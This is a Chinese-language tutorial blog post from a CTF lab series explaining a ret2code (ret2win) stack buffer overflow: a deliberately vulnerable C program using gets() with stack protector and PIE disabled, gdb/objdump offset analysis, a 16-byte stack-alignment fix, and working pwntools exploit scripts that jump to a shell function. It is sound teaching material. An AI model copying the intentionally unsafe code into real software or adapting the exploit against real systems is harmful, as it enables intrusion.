---
title: "Day7－ret2code (ret2func)"
date: 2024-09-07
draft: false
tags: ["iron-man-2024", "pwn", "binary-exploitation"]
categories: ["security-research"]
author: "YJK"
showToc: true
TocOpen: false
---


## [Lab 網址](https://github.com/YJK0805/PWN-CTF-note/)

## 前言

經過了前一天的 lab，相信大家對於 buffer overflow 的原理已經有了更多的理解。既然我們能覆蓋判斷式中的值，那麼是否也能覆蓋 return address，讓程式跳到其他位置呢？這正是我們今天要介紹的攻擊技術：ret2code，又稱為 ret2func 或 ret2win。

## 介紹

回顧之前的 stack 內容，當使用 `gets` 讀取 `buf` 字串時，可以持續覆蓋記憶體，甚至可能覆蓋到 `rbp` 和 `return address`

![image](https://hackmd.io/_uploads/HJ0565Y20.png)

例如，如果我們想跳到名為 `shell` 或 `win` 的函數，可以嘗試將 stack 覆蓋成如圖所示的狀態。當程式執行到 return address 時，它就會跳轉到我們覆蓋的位置。

![image](https://hackmd.io/_uploads/r19GRqKh0.png)

雖然在現實情況下，程式中不太可能直接有開啟 shell 的 function，但在一些初學者的 CTF 題目中，這類控制程式執行流程（control flow）的題目仍然存在。在進入實作之前，我們要了解這種攻擊的前提條件是：需要關閉 PIE 保護，因為我們必須知道確切要跳轉的 function 位置。

## Lab

查看以下程式原始碼：

```c=
#include<stdio.h>

void shell(){
    system("/bin/sh");
}

int main(){
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    char b[10];
    puts("Send me a message: ");
    gets(b);
    return 0;
}
```

使用以下指令進行編譯：

```sh=
gcc src/ret2code.c -o ./ret2code/share/ret2code -fno-stack-protector -no-pie
```

大家可以自行練習這道題目，或是繼續閱讀以下解題步驟。

## writeup

首先，我們注意到程式中存在一個 `shell()` 函數，這個函數會直接開啟一個 shell。另外，程式關閉了 Canary 和 PIE 保護，並使用了危險的 `gets` 函數來讀取輸入，因此我們可以嘗試使用 ret2code 技術跳轉到某個位置。在實作 ret2code 之前，我們需要解決以下兩個問題：

- 找出覆蓋到 return address 前所需的字元數。
- 確定 `shell()` function 的地址。

首先，找到覆蓋到 return address 前所需的字元數。我們可以使用 `objdump` 來 disassemble 程式，觀察指令 `lea rax,[rbp-0xa]`，這表示輸入的起始位置是 `[rbp-0xa]`。與前面不同的是，return address 前還有 8 個 bytes 的 `rbp`，所以需要填充的字元數是 `0xa + 0x8 = 0x12`，即 18 個字元。

![image](https://hackmd.io/_uploads/SkxM-iKnA.png)

另一種方法是使用 `gdb` 來驗證。我們先使用 `gdb ./ret2code` 啟動程式，然後在 `main` function 處設置中斷點，接著 `r` 執行程式，並 `ni` 逐步執行至輸入位置。此時，我們可以輸入有規律的字元，觀察覆蓋情況。例如輸入 `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ`

![image](https://hackmd.io/_uploads/Sk9KGjth0.png)

繼續執行至 return address 處，可以看到 return address 已被覆蓋為 `0x4747464646464545`，即 `EEFFFFGG`。因此，可以確定需要填充的字元數是 `AAAABBBBCCCCDDDDEE`，共 18 個字元。

![image](https://hackmd.io/_uploads/HJBQBjth0.png)

`shell()` 的 address 可以使用 `objdump` 或 `gdb` 來查找。使用 `objdump`，我們可以看到地址為 `0x401156`。

![image](https://hackmd.io/_uploads/B1ZRSjY2C.png)

使用 `gdb` 的 `info func` 命令，也可以看到 `shell()` function 位於 `0x401156`。

![image](https://hackmd.io/_uploads/S1OGUjK2R.png)

現在我們可以開始編寫 exploit。我們將測試 local 端程式，輸入 `0xa + 8` 個字元，並在後面加上要修改的 return address：

```py=
from pwn import *

r = process('../ret2code/share/ret2code')
# r = remote('127.0.0.1', 10001)

payload = b'A' * (0xa + 8) + p64(0x401156)

r.sendlineafter('Send me a message: ', payload)
r.interactive()
```

不過執行後會發生 SIGSEGV，此時可以使用 `gdb` 來追蹤問題。

![image](https://hackmd.io/_uploads/rk928jKnC.png)

將 exploit 加上 `gdb.attach()` 並使用 `tmux` 開啟另一個視窗。`gdb.attach()` 可以指定啟動時要執行的 gdb 指令，例如設置中斷點。

```py=
from pwn import *

r = process('../ret2code/share/ret2code')
# r = remote('127.0.0.1', 10001)

gdb.attach(r,'b main')
context.terminal = ['tmux', 'splitw', '-h']

payload = b'A' * (0xa + 8) + p64(0x401156)

r.sendlineafter('Send me a message: ', payload)
r.interactive()
```

在 `tmux` 中執行 exploit，並讓執行位置回到 `main` function。

![image](https://hackmd.io/_uploads/SJ3aOiYh0.png)

此時發現程式確實跳到 `shell()`，但遇到問題：`movaps xmmword ptr [rsp + 0x50], xmm0`，提示 `not aligned to 16 bytes`。這個問題可以參考這篇[文章](https://hack543.com/16-bytes-stack-alignment-movaps-issue/)，簡單來說，某些 libc 版本要求 `rsp` 的值必須是 16 的倍數。我們可以嘗試跳轉到前一點的位置。

![image](https://hackmd.io/_uploads/HkvZKsFnC.png)

例如，跳轉到 `0x401157` 或其他位置進行測試。

![image](https://hackmd.io/_uploads/H1tY9jFhA.png)

將 exploit 改為跳轉到 `0x401157`，並移除剛剛的 `gdb` 部分。

```py=
from pwn import *

r = process('../ret2code/share/ret2code')
# r = remote('127.0.0.1', 10001)

payload = b'A' * (0xa + 8) + p64(0x401157)

r.sendlineafter('Send me a message: ', payload)
r.interactive()
```

成功取得 shell！

![image](https://hackmd.io/_uploads/rJXZojF3C.png)

接下來將題目架設起來，並連接到遠端。

完整 exploit：

```py=
from pwn import *

# r = process('../ret2code/share/ret2code')
r = remote('127.0.0.1', 10001)

payload = b'A' * (0xa + 8) + p64(0x401157)

r.sendlineafter('Send me a message: ', payload)
r.interactive()
```

solved！！

![image](https://hackmd.io/_uploads/HkjNoiFnR.png)
